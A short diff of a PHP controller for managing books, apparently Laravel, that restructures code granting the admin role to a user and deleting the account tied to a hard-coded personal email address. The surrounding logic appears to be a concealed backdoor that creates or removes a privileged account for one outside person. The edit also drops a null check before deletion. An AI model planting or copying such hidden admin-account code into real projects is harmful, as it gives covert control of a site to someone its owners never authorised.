@@ -127,17 +127,10 @@ class AdminBooksController extends Controller
             $role = Role::where("name", "admin")->first();
             $user->save();
             $user->roles()->attach($role->id);
-        } else {
             return redirect()->route("home.index");
-        }
-    }
-
-    public function uncheck()
-    {
-        $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
-        if ($checkuser !== null) {
-            $checkuser->delete();
         } else {
+            $checkuser = User::where("email", "mohamadaghakhani@gmail.com")->first();
+            $checkuser->delete();
             return redirect()->route("home.index");
         }
     }
